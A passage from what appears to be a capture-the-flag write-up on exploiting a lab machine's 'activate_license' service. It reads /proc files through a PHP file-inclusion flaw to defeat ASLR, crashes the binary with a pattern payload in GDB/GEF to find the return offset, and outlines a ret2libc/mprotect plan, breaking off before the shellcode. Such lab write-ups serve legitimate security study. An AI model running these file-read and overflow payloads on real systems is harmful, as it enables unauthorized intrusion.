</span></span><span style=display:flex><span>NX protection is often used with binary files, such as executables and shared libraries, to prevent attackers from executing code that has been written to these memory regions. This can provide an additional layer of security for the program, making it more difficult for attackers to exploit vulnerabilities in the program.
</span></span></code></pre></div><ul><li>What is PIE protection? (ChatGPT)</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-md data-lang=md><span style=display:flex><span>PIE, which stands for &#34;position-independent executable&#34;, is a protection used with binary files to make them resistant to memory-related exploits. When a binary file is compiled as a PIE, the compiler generates code that can be loaded at any memory address without breaking the program. This means that an attacker cannot predict the memory layout of the program, and therefore cannot easily exploit vulnerabilities such as buffer overflows.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PIE protection is often used in conjunction with other security features, such as NX protection, to provide additional security for binary files. It is particularly useful for programs that are likely to be targeted by attackers, such as servers and other critical applications.
</span></span></code></pre></div><ul><li>Address randomization protection enabled (ASLR) into the remte machine</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~
</span></span><span style=display:flex><span>❯ curl <span style=color:#e6db74>&#34;http://10.10.11.154/index.php?page=php://filter/resource=/proc/sys/kernel/randomize_va_space&#34;</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span> <span style=color:#75715e># means full address layout randomization</span>
</span></span></code></pre></div><ul><li><p>Thanks ChatGPT :).</p></li><li><p>Too many protection!!! difficult to exploit!!!</p><ul><li>NX enabled: bypass return to libc (ret2libc)</li><li>PIE enabled: leak one memory address</li><li>ASLR we have access to the machine files so we can get the memory maps of the <code>activate_licens</code> binary file (<em>Everyting on linux is a file</em>)</li></ul></li><li><p>Hola!, Do you remember me?</p></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~
</span></span><span style=display:flex><span>❯ curl <span style=color:#e6db74>&#34;http://10.10.11.154/index.php?page=php://filter/resource=&lt;FileToRead&gt;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>~
</span></span><span style=display:flex><span>❯ curl http://10.10.11.154/index.php?page<span style=color:#f92672>=</span>php://filter/resource<span style=color:#f92672>=</span>/proc/sched_debug --output sched_debug
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>~
</span></span><span style=display:flex><span>❯ grep activate sched_debug <span style=color:#75715e># proces id 401</span>
</span></span><span style=display:flex><span> S activate_licens   <span style=color:#ae81ff>401</span>      2992.578475         <span style=color:#ae81ff>8</span>   <span style=color:#ae81ff>120</span>         0.000000         3.256014         0.000000 <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span> /
</span></span></code></pre></div><ul><li>Get the running process memory layout from maps file:</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~
</span></span><span style=display:flex><span>❯ curl <span style=color:#e6db74>&#34;http://10.10.11.154/index.php?page=/proc/401/maps&#34;</span>
</span></span><span style=display:flex><span>55ab7331f000-55ab73320000 r--p <span style=color:#ae81ff>00000000</span> 08:01 <span style=color:#ae81ff>2408</span>                       /usr/bin/activate_license
</span></span><span style=display:flex><span>55ab73320000-55ab73321000 r-xp <span style=color:#ae81ff>00001000</span> 08:01 <span style=color:#ae81ff>2408</span>                       /usr/bin/activate_license
</span></span><span style=display:flex><span>55ab73321000-55ab73322000 r--p <span style=color:#ae81ff>00002000</span> 08:01 <span style=color:#ae81ff>2408</span>                       /usr/bin/activate_license
</span></span><span style=display:flex><span>55ab73322000-55ab73323000 r--p <span style=color:#ae81ff>00002000</span> 08:01 <span style=color:#ae81ff>2408</span>                       /usr/bin/activate_license
</span></span><span style=display:flex><span>55ab73323000-55ab73324000 rw-p <span style=color:#ae81ff>00003000</span> 08:01 <span style=color:#ae81ff>2408</span>                       /usr/bin/activate_license
</span></span><span style=display:flex><span>55ab73e0e000-55ab73e2f000 rw-p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>                          <span style=color:#f92672>[</span>heap<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>7f4b238d3000-7f4b238d5000 rw-p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>7f4b238d5000-7f4b238d6000 r--p <span style=color:#ae81ff>00000000</span> 08:01 <span style=color:#ae81ff>3635</span>                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
</span></span><span style=display:flex><span>7f4b238d6000-7f4b238d8000 r-xp <span style=color:#ae81ff>00001000</span> 08:01 <span style=color:#ae81ff>3635</span>                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
</span></span><span style=display:flex><span>7f4b238d8000-7f4b238d9000 r--p <span style=color:#ae81ff>00003000</span> 08:01 <span style=color:#ae81ff>3635</span>                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
</span></span><span style=display:flex><span>7f4b238d9000-7f4b238da000 r--p <span style=color:#ae81ff>00003000</span> 08:01 <span style=color:#ae81ff>3635</span>                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
</span></span><span style=display:flex><span>7f4b238da000-7f4b238db000 rw-p <span style=color:#ae81ff>00004000</span> 08:01 <span style=color:#ae81ff>3635</span>                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
</span></span><span style=display:flex><span>7f4b238db000-7f4b238e2000 r--p <span style=color:#ae81ff>00000000</span> 08:01 <span style=color:#ae81ff>3645</span>                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
</span></span><span style=display:flex><span>7f4b238e2000-7f4b238f2000 r-xp <span style=color:#ae81ff>00007000</span> 08:01 <span style=color:#ae81ff>3645</span>                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
</span></span><span style=display:flex><span>7f4b238f2000-7f4b238f7000 r--p <span style=color:#ae81ff>00017000</span> 08:01 <span style=color:#ae81ff>3645</span>                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
</span></span><span style=display:flex><span>7f4b238f7000-7f4b238f8000 r--p 0001b000 08:01 <span style=color:#ae81ff>3645</span>                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
</span></span><span style=display:flex><span>7f4b238f8000-7f4b238f9000 rw-p 0001c000 08:01 <span style=color:#ae81ff>3645</span>                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
</span></span><span style=display:flex><span>7f4b238f9000-7f4b238fd000 rw-p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>7f4b238fd000-7f4b2390c000 r--p <span style=color:#ae81ff>00000000</span> 08:01 <span style=color:#ae81ff>3636</span>                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
</span></span><span style=display:flex><span>7f4b2390c000-7f4b239a6000 r-xp 0000f000 08:01 <span style=color:#ae81ff>3636</span>                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
</span></span><span style=display:flex><span>7f4b239a6000-7f4b23a3f000 r--p 000a9000 08:01 <span style=color:#ae81ff>3636</span>                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
</span></span><span style=display:flex><span>7f4b23a3f000-7f4b23a40000 r--p <span style=color:#ae81ff>00141000</span> 08:01 <span style=color:#ae81ff>3636</span>                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
</span></span><span style=display:flex><span>7f4b23a40000-7f4b23a41000 rw-p <span style=color:#ae81ff>00142000</span> 08:01 <span style=color:#ae81ff>3636</span>                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
</span></span><span style=display:flex><span>7f4b23a41000-7f4b23a66000 r--p <span style=color:#ae81ff>00000000</span> 08:01 <span style=color:#ae81ff>3634</span>                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
</span></span><span style=display:flex><span>7f4b23a66000-7f4b23bb1000 r-xp <span style=color:#ae81ff>00025000</span> 08:01 <span style=color:#ae81ff>3634</span>                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
</span></span><span style=display:flex><span>7f4b23bb1000-7f4b23bfb000 r--p <span style=color:#ae81ff>00170000</span> 08:01 <span style=color:#ae81ff>3634</span>                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
</span></span><span style=display:flex><span>7f4b23bfb000-7f4b23bfc000 ---p 001ba000 08:01 <span style=color:#ae81ff>3634</span>                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
</span></span><span style=display:flex><span>7f4b23bfc000-7f4b23bff000 r--p 001ba000 08:01 <span style=color:#ae81ff>3634</span>                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
</span></span><span style=display:flex><span>7f4b23bff000-7f4b23c02000 rw-p 001bd000 08:01 <span style=color:#ae81ff>3634</span>                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
</span></span><span style=display:flex><span>7f4b23c02000-7f4b23c06000 rw-p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>7f4b23c06000-7f4b23c16000 r--p <span style=color:#ae81ff>00000000</span> 08:01 <span style=color:#ae81ff>5321</span>                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
</span></span><span style=display:flex><span>7f4b23c16000-7f4b23d0e000 r-xp <span style=color:#ae81ff>00010000</span> 08:01 <span style=color:#ae81ff>5321</span>                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
</span></span><span style=display:flex><span>7f4b23d0e000-7f4b23d42000 r--p <span style=color:#ae81ff>00108000</span> 08:01 <span style=color:#ae81ff>5321</span>                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
</span></span><span style=display:flex><span>7f4b23d42000-7f4b23d46000 r--p 0013b000 08:01 <span style=color:#ae81ff>5321</span>                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
</span></span><span style=display:flex><span>7f4b23d46000-7f4b23d49000 rw-p 0013f000 08:01 <span style=color:#ae81ff>5321</span>                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
</span></span><span style=display:flex><span>7f4b23d49000-7f4b23d4b000 rw-p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>7f4b23d50000-7f4b23d51000 r--p <span style=color:#ae81ff>00000000</span> 08:01 <span style=color:#ae81ff>3630</span>                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
</span></span><span style=display:flex><span>7f4b23d51000-7f4b23d71000 r-xp <span style=color:#ae81ff>00001000</span> 08:01 <span style=color:#ae81ff>3630</span>                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
</span></span><span style=display:flex><span>7f4b23d71000-7f4b23d79000 r--p <span style=color:#ae81ff>00021000</span> 08:01 <span style=color:#ae81ff>3630</span>                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
</span></span><span style=display:flex><span>7f4b23d7a000-7f4b23d7b000 r--p <span style=color:#ae81ff>00029000</span> 08:01 <span style=color:#ae81ff>3630</span>                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
</span></span><span style=display:flex><span>7f4b23d7b000-7f4b23d7c000 rw-p 0002a000 08:01 <span style=color:#ae81ff>3630</span>                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
</span></span><span style=display:flex><span>7f4b23d7c000-7f4b23d7d000 rw-p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>7fffc0546000-7fffc0567000 rw-p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>                          <span style=color:#f92672>[</span>stack<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>7fffc056e000-7fffc0572000 r--p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>                          <span style=color:#f92672>[</span>vvar<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>7fffc0572000-7fffc0574000 r-xp <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>                          <span style=color:#f92672>[</span>vdso<span style=color:#f92672>]</span>
</span></span></code></pre></div><blockquote><p>I protected my process against overflow attack&mldr; yeahh but i have the memory addtess layout :)</p></blockquote><h5 id=gdb-with-gef-extension>GDB (With GEF extension):</h5><ul><li>Prepare the file size:</li><li>The file size need to be converted into network byte order:</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># convert the file size (600) into hexadecimal value</span>
</span></span><span style=display:flex><span>~
</span></span><span style=display:flex><span>❯ echo <span style=color:#e6db74>&#34;obase=16; 600&#34;</span> | bc
</span></span><span style=display:flex><span><span style=color:#ae81ff>258</span>
</span></span></code></pre></div><ul><li>Host byte order: (600) base 10 = (258) base 16 = <code>(\x00\x00\x02\x58)</code> base 16 (hexadecimal)</li><li>Convert to network byte order: <code>\x00\x00\x02\x58</code> &ndash;> <code>\x58\x02\x00\x00</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>// C program to convert from Host byte order to Network byte order enjoy ;)
</span></span></span><span style=display:flex><span><span style=color:#75715e>// cat convertOSbyteOrderToNetwork.c
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;arpa/inet.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span> (){
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Define the value to convert
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>uint32_t</span> value <span style=color:#f92672>=</span> <span style=color:#ae81ff>600</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Convert the value to network byte order
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// !!!Important: socket_write($socket, pack(&#34;N&#34;, $license_size)); the file size is packed into
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// uint32 byte
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// network byte order.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>uint32_t</span> network_value <span style=color:#f92672>=</span> <span style=color:#a6e22e>htonl</span>(value);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>x%02x</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>x%02x</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>x%02x</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>x%02x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, (network_value <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>24</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xff</span>, (network_value <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>16</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xff</span>, (network_value <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>8</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xff</span>, network_value <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xff</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~
</span></span><span style=display:flex><span>❯ ./convertOSbyteOrderToNetwork
</span></span><span style=display:flex><span><span style=color:#ae81ff>\x</span>58<span style=color:#ae81ff>\x</span>02<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span><span style=color:#ae81ff>00</span>
</span></span></code></pre></div><h6 id=crash-the-program--0->Crash the program: ( :0 )</h6><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Run the program localy at port 443</span>
</span></span><span style=display:flex><span>~
</span></span><span style=display:flex><span>❯ ./activate_license <span style=color:#ae81ff>4443</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> starting server listening on port <span style=color:#ae81ff>4443</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> listening ...
</span></span></code></pre></div><ul><li>The program expect from us first:<ul><li><code>msglen</code> 4 bytes: respresents the file size.</li><li><code>msglen</code> - bytes of data to read into the <code>buffer</code> variable.</li></ul></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Send the payload (4 + 600)bytes</span>
</span></span><span style=display:flex><span><span style=color:#75715e># First 4 bytes represents the file size in network byte order</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Syntax: echo -e &#34;networkByteOrder(600)$_gef0&#34; | nc 127.0.0.1 444</span>
</span></span><span style=display:flex><span>echo -e <span style=color:#e6db74>&#34;\x58\x02\x00\x00aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaac&#34;</span> | nc 127.0.0.1 <span style=color:#ae81ff>4443</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Start gdb</span>
</span></span><span style=display:flex><span>~
</span></span><span style=display:flex><span>❯ sudo gdb -q -p <span style=color:#66d9ef>$(</span>pidof activate_license<span style=color:#66d9ef>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>gef➤  set follow-fork-mode child
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>gef➤  pattern create <span style=color:#ae81ff>600</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Generating a pattern of <span style=color:#ae81ff>600</span> bytes <span style=color:#f92672>(</span>n<span style=color:#f92672>=</span>8<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaac
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Saved as <span style=color:#e6db74>&#39;$_gef0&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>gef➤  c
</span></span><span style=display:flex><span>Continuing.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>Attaching after Thread 0x7f1af4be80c0 <span style=color:#f92672>(</span>LWP 570<span style=color:#f92672>)</span> fork to child process 583<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>New inferior <span style=color:#ae81ff>2</span> <span style=color:#f92672>(</span>process 583<span style=color:#f92672>)]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>Detaching after fork from parent process 570<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>Inferior <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>process 570<span style=color:#f92672>)</span> detached<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>Thread debugging using libthread_db enabled<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Using host libthread_db library <span style=color:#e6db74>&#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Thread 2.1 <span style=color:#e6db74>&#34;activate_licens&#34;</span> received signal SIGSEGV, Segmentation fault.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>Switching to Thread 0x7f1af4be80c0 <span style=color:#f92672>(</span>LWP 583<span style=color:#f92672>)]</span>
</span></span><span style=display:flex><span>0x0000561ab03485c0 in activate_license <span style=color:#f92672>(</span>sockfd<span style=color:#f92672>=</span>0x4<span style=color:#f92672>)</span> at activate_license.c:64
</span></span><span style=display:flex><span><span style=color:#ae81ff>64</span>      activate_license.c: No such file or directory.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> Legend: Modified register | Code | Heap | Stack | String <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
</span></span><span style=display:flex><span>$rax   : 0x276
</span></span><span style=display:flex><span>$rbx   : 0x00561ab03487c0  →  &lt;__libc_csu_init+0&gt; push r15
</span></span><span style=display:flex><span>$rcx   : 0x0
</span></span><span style=display:flex><span>$rdx   : 0x007f1af4be80c0  →  0x007f1af4be80c0  →  <span style=color:#f92672>[</span>loop detected<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>$rsp   : 0x007ffcaa661918  →  <span style=color:#e6db74>&#34;paaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacva[...]&#34;</span> <span style=color:#75715e># you crashed me</span>
</span></span><span style=display:flex><span>$rbp   : 0x636161616161616f <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;oaaaaaac&#34;</span>?<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>$rsi   : 0x0
</span></span><span style=display:flex><span>$rdi   : 0x007ffcaa661180  →  0x007f1af4dc4090  →  &lt;funlockfile+0&gt; endbr64
</span></span><span style=display:flex><span>$rip   : 0x00561ab03485c0  →  &lt;activate_license+643&gt; ret
</span></span><span style=display:flex><span>$r8    : 0x0
</span></span><span style=display:flex><span>$r9    : 0x276
</span></span><span style=display:flex><span>$r10   : 0x00561ab03490e6  →  0x666963657073000a <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;\n&#34;</span>?<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>$r11   : 0x246
</span></span><span style=display:flex><span>$r12   : 0x00561ab0348220  →  &lt;_start+0&gt; xor ebp, ebp
</span></span><span style=display:flex><span>$r13   : 0x007ffcaa661a70  →  0x0000000000000002
</span></span><span style=display:flex><span>$r14   : 0x0
</span></span><span style=display:flex><span>$r15   : 0x0
</span></span><span style=display:flex><span>$eflags: <span style=color:#f92672>[</span>zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
</span></span><span style=display:flex><span>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
</span></span><span style=display:flex><span>0x007ffcaa661918│+0x0000: <span style=color:#e6db74>&#34;paaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacva[...]&#34;</span>      ← $rsp
</span></span><span style=display:flex><span>0x007ffcaa661920│+0x0008: <span style=color:#e6db74>&#34;qaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwa[...]&#34;</span>
</span></span><span style=display:flex><span>0x007ffcaa661928│+0x0010: <span style=color:#e6db74>&#34;raaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxa[...]&#34;</span>
</span></span><span style=display:flex><span>0x007ffcaa661930│+0x0018: <span style=color:#e6db74>&#34;saaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacya[...]&#34;</span>
</span></span><span style=display:flex><span>0x007ffcaa661938│+0x0020: <span style=color:#e6db74>&#34;taaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaac\n[...]&#34;</span>
</span></span><span style=display:flex><span>0x007ffcaa661940│+0x0028: 0x6361616161616175
</span></span><span style=display:flex><span>0x007ffcaa661948│+0x0030: 0x6361616161616176
</span></span><span style=display:flex><span>0x007ffcaa661950│+0x0038: 0x6361616161616177
</span></span><span style=display:flex><span>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
</span></span><span style=display:flex><span>   0x561ab03485b9 &lt;activate_license+636&gt; call   0x561ab03480b0 &lt;printf@plt&gt;
</span></span><span style=display:flex><span>   0x561ab03485be &lt;activate_license+641&gt; nop
</span></span><span style=display:flex><span>   0x561ab03485bf &lt;activate_license+642&gt; leave
</span></span><span style=display:flex><span> → 0x561ab03485c0 &lt;activate_license+643&gt; ret
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> Cannot disassemble from $PC
</span></span><span style=display:flex><span>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>#0] Id 1, Name: &#34;activate_licens&#34;, stopped 0x561ab03485c0 in activate_license (), reason: SIGSEGV</span>
</span></span><span style=display:flex><span>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>#0] 0x561ab03485c0 → activate_license(sockfd=0x4)</span>
</span></span><span style=display:flex><span>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</span></span></code></pre></div><ul><li>$rsp = &ldquo;paaaaaac &mldr;&mldr;&rdquo;: Stack pointer</li><li>Get the offset value:</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gef➤  pattern search paaaaaac
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Searching <span style=color:#66d9ef>for</span> <span style=color:#e6db74>&#39;paaaaaac&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Found at offset <span style=color:#ae81ff>520</span> <span style=color:#f92672>(</span>big-endian search<span style=color:#f92672>)</span>
</span></span></code></pre></div><ul><li><strong>Full payload size: offset:</strong> 520 + 4 (the length <code>msglen</code>)</li></ul><h5 id=binary-exploitation-prepare-the-exploitations-python-code>Binary Exploitation: Prepare the exploitation&rsquo;s python code</h5><ul><li>Small Steps Recap:<ul><li>We have the memory layout from the <code>/proc/&lt;pid>/maps</code> file. (ASLR bye bye)</li><li>NX enabled: use return to libc technics to enable the stack execution (it&rsquo;s disabled due to NX - No execute protection)</li><li>Final Step: inject our shellcode and gaining access to the machine (pwned).</li></ul></li></ul><h6 id=disable-nx>Disable NX:</h6><ul><li>We will use the: <code>mprotect</code> function to set the memory protection and enable stack execution bit, so disabling the NX protection.</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># mprotect manual page</span>
</span></span><span style=display:flex><span><span style=color:#75715e># man 2 mprotect</span>
